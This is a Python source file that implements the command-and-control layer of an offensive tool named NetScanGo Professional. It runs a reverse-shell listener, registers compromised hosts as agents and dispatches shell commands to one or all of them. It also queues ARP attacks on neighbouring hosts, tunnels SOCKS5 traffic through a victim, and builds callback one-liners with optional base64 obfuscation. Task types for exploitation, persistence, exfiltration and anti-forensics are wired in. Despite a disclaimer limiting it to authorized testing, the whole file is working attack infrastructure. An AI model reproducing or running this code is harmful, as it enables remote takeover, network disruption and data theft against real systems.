"""
c2_infrastructure.py — Command & Control Infrastructure Layer
=============================================================
Provides a unified C2 management layer for NetScanGo Professional.

Responsibilities
----------------
* Session & agent lifecycle management
* Task queue creation, dispatch, and result collection
* Heartbeat / beacon monitoring with auto-eviction of dead agents
* Integration with ReverseShell (socket-based agents) and
  NetworkDisruptor (ARP-based disruption)
* Campaign tracking and persistent audit logging
* Thread-safe state management for concurrent Dash callbacks

LEGAL DISCLAIMER
----------------
This module is intended for authorized penetration testing,
red-team exercises, and security research only.
Unauthorized use against systems you do not own or have explicit
written permission to test is illegal and unethical.
"""

from __future__ import annotations

import json
import logging
import os
import queue
import threading
import time
import uuid
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from .reverse_shell import ReverseShell
from .network_disruptor import NetworkDisruptor
from .socks_bridge import SocksBridge
from .payload_generator import PayloadGenerator
from .exploitation import ExploitationFramework
from .lateral_movement import LateralMovement
from .privilege_escalation import PrivilegeEscalation
from .persistence import PersistenceMechanisms
from .data_exfiltration import DataExfiltration
from .anti_forensics import AntiForensics


# ---------------------------------------------------------------------------
# Enumerations
# ---------------------------------------------------------------------------

class AgentStatus(str, Enum):
    ACTIVE    = "active"
    IDLE      = "idle"
    DEAD      = "dead"
    TASKED    = "tasked"


class TaskStatus(str, Enum):
    PENDING   = "pending"
    SENT      = "sent"
    COMPLETED = "completed"
    FAILED    = "failed"
    TIMEOUT   = "timeout"


class TaskType(str, Enum):
    SHELL_CMD    = "shell_cmd"     # Execute shell command on agent
    FILE_GET     = "file_get"      # Download file from agent
    FILE_PUT     = "file_put"      # Upload file to agent
    SCAN         = "scan"          # Trigger local network scan
    DISRUPT      = "disrupt"       # ARP-disrupt a neighbouring host
    STOP_DISRUPT = "stop_disrupt"  # Stop ARP disruption
    PIVOT        = "pivot"         # Use agent as pivot for deeper scan
    SYSINFO      = "sysinfo"       # Collect system information
    START_PROXY  = "start_proxy"   # Activate reverse SOCKS5 proxy tunnel
    EXPLOIT      = "exploit"       # Run an exploit
    LATERAL      = "lateral"       # Lateral movement
    ESCALATE     = "escalate"      # Privilege escalation
    PERSIST      = "persist"       # Establish persistence
    EXFIL        = "exfil"         # Data exfiltration
    ANTIFORENSIC = "antiforensic"  # Anti-forensics


# ---------------------------------------------------------------------------
# Data models (plain dicts wrapped in small dataclasses for clarity)
# ---------------------------------------------------------------------------

class Agent:
    """Represents a connected / previously connected remote agent."""

    def __init__(
        self,
        agent_id: str,
        ip: str,
        port: int,
        conn_id: str,
        hostname: str = "unknown",
        os_info: str = "unknown",
        username: str = "unknown",
    ) -> None:
        self.agent_id     = agent_id
        self.ip           = ip
        self.port         = port
        self.conn_id      = conn_id          # maps to ReverseShell.active_connections
        self.hostname     = hostname
        self.os_info      = os_info
        self.username     = username
        self.status       = AgentStatus.ACTIVE
        self.first_seen   = datetime.now()
        self.last_seen    = datetime.now()
        self.task_history: List[str] = []    # list of task_ids
        self.tags: List[str] = []

    def touch(self) -> None:
        """Update last-seen timestamp and mark as active."""
        self.last_seen = datetime.now()
        if self.status == AgentStatus.DEAD:
            self.status = AgentStatus.ACTIVE

    def to_dict(self) -> Dict[str, Any]:
        return {
            "agent_id":    self.agent_id,
            "ip":          self.ip,
            "port":        self.port,
            "conn_id":     self.conn_id,
            "hostname":    self.hostname,
            "os_info":     self.os_info,
            "username":    self.username,
            "status":      self.status.value,
            "first_seen":  self.first_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "last_seen":   self.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "tasks_run":   len(self.task_history),
            "tags":        self.tags,
        }


class Task:
    """A unit of work dispatched to (or queued for) an agent."""

    def __init__(
        self,
        task_type: TaskType,
        agent_id: str,
        payload: Any = None,
        timeout: int = 30,
    ) -> None:
        self.task_id     = str(uuid.uuid4())[:8]
        self.task_type   = task_type
        self.agent_id    = agent_id
        self.payload     = payload           # type-specific; see TaskType docs
        self.timeout     = timeout
        self.status      = TaskStatus.PENDING
        self.created_at  = datetime.now()
        self.sent_at: Optional[datetime]     = None
        self.completed_at: Optional[datetime] = None
        self.result: Optional[Any]           = None
        self.error: Optional[str]            = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "task_id":      self.task_id,
            "task_type":    self.task_type.value,
            "agent_id":     self.agent_id,
            "payload":      self.payload,
            "status":       self.status.value,
            "created_at":   self.created_at.strftime("%Y-%m-%d %H:%M:%S"),
            "sent_at":      self.sent_at.strftime("%Y-%m-%d %H:%M:%S") if self.sent_at else None,
            "completed_at": self.completed_at.strftime("%Y-%m-%d %H:%M:%S") if self.completed_at else None,
            "result":       self.result,
            "error":        self.error,
        }


class Campaign:
    """Groups agents and tasks under a named operation."""

    def __init__(self, name: str, description: str = "") -> None:
        self.campaign_id  = str(uuid.uuid4())[:8]
        self.name         = name
        self.description  = description
        self.created_at   = datetime.now()
        self.agent_ids:   List[str] = []
        self.task_ids:    List[str] = []
        self.notes:       List[str] = []

    def to_dict(self) -> Dict[str, Any]:
        return {
            "campaign_id": self.campaign_id,
            "name":        self.name,
            "description": self.description,
            "created_at":  self.created_at.strftime("%Y-%m-%d %H:%M:%S"),
            "agents":      len(self.agent_ids),
            "tasks":       len(self.task_ids),
            "notes":       self.notes,
        }


# ---------------------------------------------------------------------------
# Main C2 Infrastructure class
# ---------------------------------------------------------------------------

class C2Infrastructure:
    """
    Command & Control orchestration layer for NetScanGo Professional.

    Usage
    -----
    >>> c2 = C2Infrastructure()
    >>> c2.start_listener(port=4444)         # accept reverse shells
    >>> agents = c2.get_active_agents()
    >>> task  = c2.queue_task(
    ...     agent_id=agents[0]['agent_id'],
    ...     task_type=TaskType.SHELL_CMD,
    ...     payload='whoami',
    ... )
    >>> c2.stop_listener()
    """

    # Agents are declared dead after this many seconds of silence
    HEARTBEAT_TIMEOUT: int = 120
    # Background worker polling interval (seconds)
    WORKER_INTERVAL: float = 2.0
    # Maximum tasks kept in completed history
    MAX_TASK_HISTORY: int  = 500

    def __init__(self) -> None:
        # Sub-systems
        self.reverse_shell  = ReverseShell()
        self.disruptor      = NetworkDisruptor()
        self.socks_bridge   = SocksBridge()
        self.payload_generator = PayloadGenerator()
        self.exploitation_framework = ExploitationFramework()
        self.lateral_movement = LateralMovement()
        self.privilege_escalation = PrivilegeEscalation()
        self.persistence_mechanisms = PersistenceMechanisms()
        self.data_exfiltration = DataExfiltration()
        self.anti_forensics = AntiForensics()

        # State
        self._agents:    Dict[str, Agent]    = {}   # agent_id → Agent
        self._tasks:     Dict[str, Task]     = {}   # task_id  → Task
        self._campaigns: Dict[str, Campaign] = {}   # campaign_id → Campaign
        self._task_queues: Dict[str, queue.Queue] = {}  # agent_id → Queue

        # Threading
        self._lock            = threading.RLock()
        self._running         = False
        self._worker_thread: Optional[threading.Thread] = None

        # Logging
        self.logger = logging.getLogger("c2_infrastructure")
        self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            os.makedirs("instance", exist_ok=True)
            fh = logging.FileHandler("instance/c2_infrastructure.log")
            fh.setFormatter(logging.Formatter(
                "%(asctime)s [%(levelname)s] %(name)s — %(message)s"
            ))
            self.logger.addHandler(fh)

        self.logger.info("C2Infrastructure initialised")

    # ------------------------------------------------------------------
    # Listener lifecycle
    # ------------------------------------------------------------------

    def start_listener(
        self, 
        host: str = "0.0.0.0", 
        port: int = 4444,
        use_ssl: bool = False,
        certfile: Optional[str] = None,
        keyfile: Optional[str] = None
    ) -> Tuple[bool, str]:
        """
        Start the reverse-shell listener (HTTP or HTTPS) and the background worker.

        Returns (success, message).
        """
        # Pass the SSL parameters down to the BeaconC2Server
        success, msg = self.reverse_shell.start_listener(
            host=host, 
            port=port, 
            use_ssl=use_ssl, 
            certfile=certfile, 
            keyfile=keyfile
        )
        
        if not success:
            return False, msg

        self._running = True
        self._worker_thread = threading.Thread(
            target=self._background_worker,
            daemon=True,
            name="c2-worker",
        )
        self._worker_thread.start()
        
        scheme = "https" if use_ssl else "http"
        self.logger.info("C2 listener started on %s://%s:%d", scheme, host, port)
        return True, f"C2 listener active on {scheme}://{host}:{port}"

    def stop_listener(self) -> Tuple[bool, str]:
        """Stop the listener, worker thread and all active disruptions."""
        self._running = False
        self.reverse_shell.stop_listener()
        self.disruptor.stop_all_attacks()

        if self._worker_thread and self._worker_thread.is_alive():
            self._worker_thread.join(timeout=5)

        self.logger.info("C2 listener stopped")
        return True, "C2 listener stopped"

    @property
    def is_listening(self) -> bool:
        return self.reverse_shell.listening

    # ------------------------------------------------------------------
    # Agent management
    # ------------------------------------------------------------------

    def register_agent(
        self,
        conn_id: str,
        hostname: str = "unknown",
        os_info: str = "unknown",
        username: str = "unknown",
    ) -> Optional[Agent]:
        """
        Promote a raw ReverseShell connection into a managed Agent record.

        Parameters
        ----------
        conn_id : str
            Key from ``ReverseShell.active_connections``.
        """
        with self._lock:
            conn_info = self.reverse_shell.active_connections.get(conn_id)
            if not conn_info:
                self.logger.warning("register_agent: conn_id %s not found", conn_id)
                return None

            # Avoid duplicate registration
            for agent in self._agents.values():
                if agent.conn_id == conn_id:
                    agent.touch()
                    return agent

            ip, port = conn_info["address"]
            agent_id = str(uuid.uuid4())[:8]

            agent = Agent(
                agent_id=agent_id,
                ip=ip,
                port=port,
                conn_id=conn_id,
                hostname=hostname,
                os_info=os_info,
                username=username,
            )
            self._agents[agent_id] = agent
            self._task_queues[agent_id] = queue.Queue()

            self.logger.info(
                "Agent registered: %s @ %s (%s / %s)",
                agent_id, ip, hostname, os_info,
            )
            return agent

    def unregister_agent(self, agent_id: str) -> Tuple[bool, str]:
        """Mark an agent as dead and clean up its resources."""
        with self._lock:
            agent = self._agents.get(agent_id)
            if not agent:
                return False, f"Agent {agent_id} not found"

            agent.status = AgentStatus.DEAD
            self.reverse_shell.close_connection(agent.conn_id)

            if agent_id in self._task_queues:
                del self._task_queues[agent_id]

            self.logger.info("Agent unregistered: %s", agent_id)
            return True, f"Agent {agent_id} removed"

    def get_agent(self, agent_id: str) -> Optional[Agent]:
        with self._lock:
            return self._agents.get(agent_id)

    def get_all_agents(self) -> List[Dict[str, Any]]:
        """Return serialisable list of all agents."""
        with self._lock:
            return [a.to_dict() for a in self._agents.values()]

    def get_active_agents(self) -> List[Dict[str, Any]]:
        """Return only agents whose status is ACTIVE or TASKED."""
        with self._lock:
            return [
                a.to_dict()
                for a in self._agents.values()
                if a.status in (AgentStatus.ACTIVE, AgentStatus.TASKED, AgentStatus.IDLE)
            ]

    def tag_agent(self, agent_id: str, tag: str) -> Tuple[bool, str]:
        """Attach a free-form label to an agent for campaign grouping."""
        with self._lock:
            agent = self._agents.get(agent_id)
            if not agent:
                return False, f"Agent {agent_id} not found"
            if tag not in agent.tags:
                agent.tags.append(tag)
            return True, f"Tag '{tag}' added to {agent_id}"

    # ------------------------------------------------------------------
    # Task management
    # ------------------------------------------------------------------

    def queue_task(
        self,
        agent_id: str,
        task_type: TaskType,
        payload: Any = None,
        timeout: int = 30,
        campaign_id: Optional[str] = None,
    ) -> Tuple[bool, str, Optional[Task]]:
        """
        Create and enqueue a task for a specific agent.

        Returns (success, message, task_or_None).
        """
        with self._lock:
            agent = self._agents.get(agent_id)
            if not agent:
                return False, f"Agent {agent_id} not found", None
            if agent.status == AgentStatus.DEAD:
                return False, f"Agent {agent_id} is dead", None

            task = Task(
                task_type=task_type,
                agent_id=agent_id,
                payload=payload,
                timeout=timeout,
            )
            self._tasks[task.task_id] = task

            if agent_id not in self._task_queues:
                self._task_queues[agent_id] = queue.Queue()
            self._task_queues[agent_id].put(task.task_id)

            agent.task_history.append(task.task_id)
            agent.status = AgentStatus.TASKED

            if campaign_id and campaign_id in self._campaigns:
                self._campaigns[campaign_id].task_ids.append(task.task_id)

            self.logger.info(
                "Task queued: [%s] type=%s agent=%s payload=%r",
                task.task_id, task_type.value, agent_id, payload,
            )
            return True, f"Task {task.task_id} queued", task

    def get_task(self, task_id: str) -> Optional[Dict[str, Any]]:
        with self._lock:
            task = self._tasks.get(task_id)
            return task.to_dict() if task else None

    def get_tasks_for_agent(self, agent_id: str) -> List[Dict[str, Any]]:
        with self._lock:
            return [
                t.to_dict()
                for t in self._tasks.values()
                if t.agent_id == agent_id
            ]

    def get_all_tasks(self) -> List[Dict[str, Any]]:
        with self._lock:
            return [t.to_dict() for t in self._tasks.values()]

    def cancel_task(self, task_id: str) -> Tuple[bool, str]:
        with self._lock:
            task = self._tasks.get(task_id)
            if not task:
                return False, f"Task {task_id} not found"
            if task.status != TaskStatus.PENDING:
                return False, f"Task {task_id} already in state '{task.status.value}'"
            task.status = TaskStatus.FAILED
            task.error = "Cancelled by operator"
            return True, f"Task {task_id} cancelled"

    def complete_task(
        self, task_id: str, result: Any = None, error: Optional[str] = None
    ) -> Tuple[bool, str]:
        """
        Mark a task as completed or failed and store its result.
        Called by dispatch workers or external result handlers.
        """
        with self._lock:
            task = self._tasks.get(task_id)
            if not task:
                return False, f"Task {task_id} not found"

            task.completed_at = datetime.now()
            if error:
                task.status = TaskStatus.FAILED
                task.error  = error
            else:
                task.status = TaskStatus.COMPLETED
                task.result = result

            # Update agent status back to idle if no more pending tasks
            agent_q = self._task_queues.get(task.agent_id)
            agent   = self._agents.get(task.agent_id)
            if agent and (not agent_q or agent_q.empty()):
                agent.status = AgentStatus.IDLE

            self.logger.info(
                "Task completed: [%s] status=%s", task_id, task.status.value
            )
            return True, f"Task {task_id} completed"

    # ------------------------------------------------------------------
    # Convenience task dispatchers
    # ------------------------------------------------------------------

    def execute_shell_command(
        self, agent_id: str, command: str
    ) -> Tuple[bool, str, Optional[str]]:
        """
        Send a shell command to an agent via its reverse-shell connection.

        Returns (success, message, task_id).
        """
        with self._lock:
            agent = self._agents.get(agent_id)
            if not agent:
                return False, f"Agent {agent_id} not found", None

            ok, msg = self.reverse_shell.execute_command(agent.conn_id, command)
            if not ok:
                return False, msg, None

        # Log malicious action with user/agent context
        self.logger.warning(
            f"MALICIOUS ACTION: Shell command executed on agent {agent_id} ({agent.hostname}@{agent.ip}): '{command}'"
        )

        ok, msg, task = self.queue_task(
            agent_id=agent_id,
            task_type=TaskType.SHELL_CMD,
            payload=command,
        )
        task_id = task.task_id if task else None
        # Mark sent immediately for shell tasks (no async ack)
        if task:
            with self._lock:
                task.status  = TaskStatus.SENT
                task.sent_at = datetime.now()

        return ok, msg, task_id

    def broadcast_command(self, command: str) -> Dict[str, Any]:
        """Send the same shell command to all active agents."""
        results: Dict[str, Any] = {}
        for agent_id in list(self._agents.keys()):
            ok, msg, task_id = self.execute_shell_command(agent_id, command)
            results[agent_id] = {"success": ok, "message": msg, "task_id": task_id}
        return results

    def disrupt_via_agent(
        self,
        agent_id: str,
        target_ip: str,
        duration: Optional[int] = None,
    ) -> Tuple[bool, str]:
        """
        Queue an ARP-disruption task.

        The background worker calls NetworkDisruptor.kick_device().
        """
        return self.queue_task(
            agent_id=agent_id,
            task_type=TaskType.DISRUPT,
            payload={"target_ip": target_ip, "duration": duration},
        )[:2]

    def stop_disruption(self, agent_id: str, target_ip: str) -> Tuple[bool, str]:
        """Queue a stop-disruption task for a specific target IP."""
        return self.queue_task(
            agent_id=agent_id,
            task_type=TaskType.STOP_DISRUPT,
            payload={"target_ip": target_ip},
        )[:2]

    def start_proxy(
        self,
        agent_id: str,
        c2_host: str,
        ws_port: int = 8889,
        socks_port: int = 1080,
    ) -> Tuple[bool, str, Optional[str]]:
        """
        Activate the reverse SOCKS5 proxy tunnel through the given agent.

        Steps
        -----
        1. Start the SocksBridge (WebSocket + SOCKS5 servers) if not running.
        2. Set the agent as the active tunnel endpoint.
        3. Queue a START_PROXY task so the beacon dials back to the WS server.

        Parameters
        ----------
        agent_id  : ID of the beacon to use as the pivot host.
        c2_host   : IP / hostname that the agent will connect *to* (this C2).
        ws_port   : Port the SocksBridge WebSocket server listens on (default 8889).
        socks_port: Port the operator's tool connects to locally (default 1080).

        Returns
        -------
        (success, message, task_id)
        """
        with self._lock:
            agent = self._agents.get(agent_id)
            if not agent:
                return False, f"Agent {agent_id} not found", None

        # 1. Ensure the SocksBridge is running
        if not self.socks_bridge.is_running:
            ok, msg = self.socks_bridge.start(
                ws_port=ws_port,
                socks_port=socks_port,
            )
            if not ok:
                return False, f"SocksBridge start failed: {msg}", None

        # 2. Select the agent as the tunnel endpoint
        self.socks_bridge.set_active_agent(agent_id)

        # 3. Build the WebSocket URL and queue START_PROXY to the agent.
        #    The beacon's Run() loop recognises "start_proxy" and calls RunProxy().
        ws_url = f"ws://{c2_host}:{ws_port}/tunnel/{agent_id}"
        ok, msg, task = self.queue_task(
            agent_id=agent_id,
            task_type=TaskType.START_PROXY,
            payload=ws_url,
            timeout=0,   # long-running; no timeout
        )
        task_id = task.task_id if task else None
        self.logger.info(
            "start_proxy queued for agent=%s ws_url=%s", agent_id, ws_url
        )
        return ok, msg, task_id

    def stop_proxy(self) -> Tuple[bool, str]:
        """Stop the SOCKS5 proxy bridge and clear the active agent."""
        return self.socks_bridge.stop()

    def collect_sysinfo(self, agent_id: str) -> Tuple[bool, str, Optional[str]]:
        """Queue a SYSINFO task — dispatched as shell commands by the worker."""
        ok, msg, task = self.queue_task(
            agent_id=agent_id,
            task_type=TaskType.SYSINFO,
            payload=None,
        )
        return ok, msg, task.task_id if task else None

    # ------------------------------------------------------------------
    # Campaign management
    # ------------------------------------------------------------------

    def create_campaign(self, name: str, description: str = "") -> Campaign:
        """Create and register a new operation campaign."""
        campaign = Campaign(name=name, description=description)
        with self._lock:
            self._campaigns[campaign.campaign_id] = campaign
        self.logger.info("Campaign created: [%s] %s", campaign.campaign_id, name)
        return campaign

    def add_agent_to_campaign(
        self, campaign_id: str, agent_id: str
    ) -> Tuple[bool, str]:
        with self._lock:
            campaign = self._campaigns.get(campaign_id)
            if not campaign:
                return False, f"Campaign {campaign_id} not found"
            if agent_id not in campaign.agent_ids:
                campaign.agent_ids.append(agent_id)
            return True, f"Agent {agent_id} added to campaign {campaign_id}"

    def add_campaign_note(self, campaign_id: str, note: str) -> Tuple[bool, str]:
        with self._lock:
            campaign = self._campaigns.get(campaign_id)
            if not campaign:
                return False, f"Campaign {campaign_id} not found"
            campaign.notes.append(
                f"[{datetime.now().strftime('%H:%M:%S')}] {note}"
            )
            return True, "Note added"

    def get_all_campaigns(self) -> List[Dict[str, Any]]:
        with self._lock:
            return [c.to_dict() for c in self._campaigns.values()]

    def get_campaign(self, campaign_id: str) -> Optional[Dict[str, Any]]:
        with self._lock:
            campaign = self._campaigns.get(campaign_id)
            return campaign.to_dict() if campaign else None

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    def generate_agent_payload(
        self,
        c2_host: str,
        c2_port: int = 4444,
        shell_type: str = "bash",
        obfuscate: bool = False,
    ) -> str:
        """
        Build a one-liner that calls back to this C2 server.

        Parameters
        ----------
        c2_host    : IP or hostname of this C2 server.
        c2_port    : Listening port.
        shell_type : One of bash, python, perl, nc, php.
        obfuscate  : If True, wraps python payload in base64.
        """
        base = self.reverse_shell.generate_payload(c2_host, c2_port, shell_type)

        if obfuscate and shell_type == "python":
            import base64 as _b64
            encoded = _b64.b64encode(base.encode()).decode()
            base = (
                f"python -c \"import base64,os;"
                f"exec(base64.b64decode('{encoded}').decode())\""
            )

        return base

    def generate_multi_payload(
        self, c2_host: str, c2_port: int = 4444
    ) -> Dict[str, str]:
        """Return payloads for all supported shell types."""
        return {
            stype: self.generate_agent_payload(c2_host, c2_port, stype)
            for stype in ("bash", "python", "perl", "nc", "php")
        }

    # ------------------------------------------------------------------
    # Statistics & reporting
    # ------------------------------------------------------------------

    def get_statistics(self) -> Dict[str, Any]:
        """Return an aggregated summary suitable for dashboard display."""
        with self._lock:
            agents  = list(self._agents.values())
            tasks   = list(self._tasks.values())
            attacks = self.disruptor.get_active_attacks()

        def _count(lst, attr, val):
            return sum(1 for x in lst if getattr(x, attr) == val)

        task_by_status: Dict[str, int] = {}
        for t in tasks:
            key = t.status.value
            task_by_status[key] = task_by_status.get(key, 0) + 1

        return {
            "listener_active":   self.is_listening,
            "total_agents":      len(agents),
            "active_agents":     _count(agents, "status", AgentStatus.ACTIVE),
            "idle_agents":       _count(agents, "status", AgentStatus.IDLE),
            "tasked_agents":     _count(agents, "status", AgentStatus.TASKED),
            "dead_agents":       _count(agents, "status", AgentStatus.DEAD),
            "total_tasks":       len(tasks),
            "tasks_by_status":   task_by_status,
            "active_disruptions": len(attacks),
            "campaigns":         len(self._campaigns),
        }

    def export_session_log(self, filepath: Optional[str] = None) -> str:
        """
        Write the full session state (agents + tasks + campaigns) to a JSON
        file and return the path.
        """
        os.makedirs("instance", exist_ok=True)
        if not filepath:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = f"instance/c2_session_{ts}.json"

        with self._lock:
            data = {
                "exported_at": datetime.now().isoformat(),
                "statistics":  self.get_statistics(),
                "agents":      [a.to_dict() for a in self._agents.values()],
                "tasks":       [t.to_dict() for t in self._tasks.values()],
                "campaigns":   [c.to_dict() for c in self._campaigns.values()],
            }

        with open(filepath, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, default=str)

        self.logger.info("Session exported to %s", filepath)
        return filepath

    # ------------------------------------------------------------------
    # Background worker
    # ------------------------------------------------------------------

    def _background_worker(self) -> None:
        """
        Continuously:
        1. Sync new ReverseShell connections → register as agents.
        2. Dispatch pending tasks from each agent's queue.
        3. Evict agents that have exceeded HEARTBEAT_TIMEOUT.
        4. Prune task history if it grows too large.
        """
        self.logger.info("C2 background worker started")

        while self._running:
            try:
                self._sync_new_connections()
                self._dispatch_pending_tasks()
                self._evict_dead_agents()
                self._prune_task_history()
            except Exception as exc:
                self.logger.error("Worker error: %s", exc, exc_info=True)

            time.sleep(self.WORKER_INTERVAL)

        self.logger.info("C2 background worker stopped")

    def _sync_new_connections(self) -> None:
        """
        Check ReverseShell.active_connections for connections that have
        not yet been registered as agents and auto-register them.
        """
        with self._lock:
            known_conn_ids = {a.conn_id for a in self._agents.values()}
            for conn_id in list(self.reverse_shell.active_connections.keys()):
                if conn_id not in known_conn_ids:
                    self.register_agent(conn_id)

    def _dispatch_pending_tasks(self) -> None:
        """
        For each agent with pending tasks, pop one task and execute it.
        """
        with self._lock:
            agent_ids = list(self._task_queues.keys())

        for agent_id in agent_ids:
            q = self._task_queues.get(agent_id)
            if not q or q.empty():
                continue

            try:
                task_id = q.get_nowait()
            except queue.Empty:
                continue

            with self._lock:
                task  = self._tasks.get(task_id)
                agent = self._agents.get(agent_id)

            if not task or not agent:
                continue
            if task.status != TaskStatus.PENDING:
                continue
            if agent.status == AgentStatus.DEAD:
                with self._lock:
                    task.status = TaskStatus.FAILED
                    task.error  = "Agent is dead"
                continue

            self._execute_task(agent, task)

    def _execute_task(self, agent: Agent, task: Task) -> None:
        """Route a task to the appropriate executor."""
        with self._lock:
            task.status  = TaskStatus.SENT
            task.sent_at = datetime.now()

        try:
            if task.task_type == TaskType.SHELL_CMD:
                self._exec_shell_cmd(agent, task)

            elif task.task_type == TaskType.SYSINFO:
                self._exec_sysinfo(agent, task)

            elif task.task_type == TaskType.DISRUPT:
                self._exec_disrupt(agent, task)

            elif task.task_type == TaskType.STOP_DISRUPT:
                self._exec_stop_disrupt(agent, task)

            elif task.task_type == TaskType.START_PROXY:
                self._exec_start_proxy(agent, task)

            else:
                self.complete_task(task.task_id, error=f"Unsupported task type: {task.task_type}")

        except Exception as exc:
            self.complete_task(task.task_id, error=str(exc))
            self.logger.error("Task dispatch error [%s]: %s", task.task_id, exc)

    def _exec_shell_cmd(self, agent: Agent, task: Task) -> None:
        command = task.payload or ""
        ok, msg = self.reverse_shell.execute_command(agent.conn_id, command)
        if ok:
            agent.touch()
            self.complete_task(task.task_id, result={"command": command, "status": "sent"})
        else:
            self.complete_task(task.task_id, error=msg)

    def _exec_sysinfo(self, agent: Agent, task: Task) -> None:
        """Dispatch a sequence of info-gathering commands."""
        cmds = ["whoami", "hostname", "uname -a || ver", "id || whoami /groups"]
        for cmd in cmds:
            self.reverse_shell.execute_command(agent.conn_id, cmd)
            time.sleep(0.3)
        agent.touch()
        self.complete_task(task.task_id, result={"commands_sent": cmds})

    def _exec_disrupt(self, agent: Agent, task: Task) -> None:
        payload    = task.payload or {}
        target_ip  = payload.get("target_ip", "")
        duration   = payload.get("duration")

        if not target_ip:
            self.complete_task(task.task_id, error="No target_ip specified")
            return

        ok, msg = self.disruptor.kick_device(target_ip, duration)
        if ok:
            self.complete_task(task.task_id, result={"target_ip": target_ip, "message": msg})
        else:
            self.complete_task(task.task_id, error=msg)

    def _exec_stop_disrupt(self, agent: Agent, task: Task) -> None:
        payload   = task.payload or {}
        target_ip = payload.get("target_ip", "")

        if not target_ip:
            self.disruptor.stop_all_attacks()
            self.complete_task(task.task_id, result={"message": "All disruptions stopped"})
        else:
            ok, msg = self.disruptor.stop_attack(target_ip)
            if ok:
                self.complete_task(task.task_id, result={"target_ip": target_ip, "message": msg})
            else:
                self.complete_task(task.task_id, error=msg)

    def _exec_start_proxy(self, agent: Agent, task: Task) -> None:
        """
        Relay the WebSocket URL to the agent via the reverse-shell transport.

        The beacon's Run() loop recognises task type "start_proxy" and calls
        RunProxy(ws_url) in a separate goroutine, leaving normal polling intact.
        The task is marked SENT immediately; it is long-running by design and
        has no discrete completion event.
        """
        ws_url = task.payload or ""
        if not ws_url:
            self.complete_task(task.task_id, error="No ws_url in START_PROXY payload")
            return

        ok, msg = self.reverse_shell.execute_command(
            agent.conn_id,
            ws_url,              # beacon interprets this as RunProxy argument
        )
        if ok:
            agent.touch()
            # Mark sent — tunnel is long-running, completion tracked separately
            with self._lock:
                task.status  = TaskStatus.SENT
                task.sent_at = datetime.now()
            self.logger.info(
                "START_PROXY dispatched to agent=%s ws_url=%s", agent.agent_id, ws_url
            )
        else:
            self.complete_task(task.task_id, error=msg)

    def _evict_dead_agents(self) -> None:
        """Mark agents that have been silent too long as DEAD."""
        now = datetime.now()
        with self._lock:
            for agent in self._agents.values():
                if agent.status == AgentStatus.DEAD:
                    continue
                elapsed = (now - agent.last_seen).total_seconds()
                if elapsed > self.HEARTBEAT_TIMEOUT:
                    agent.status = AgentStatus.DEAD
                    self.logger.warning(
                        "Agent evicted (timeout): %s @ %s", agent.agent_id, agent.ip
                    )

    def _prune_task_history(self) -> None:
        """Remove oldest completed tasks if the dict grows beyond MAX_TASK_HISTORY."""
        with self._lock:
            completed = [
                t for t in self._tasks.values()
                if t.status in (TaskStatus.COMPLETED, TaskStatus.FAILED, TaskStatus.TIMEOUT)
            ]
            if len(completed) > self.MAX_TASK_HISTORY:
                to_remove = sorted(completed, key=lambda t: t.created_at)[
                    : len(completed) - self.MAX_TASK_HISTORY
                ]
                for task in to_remove:
                    del self._tasks[task.task_id]
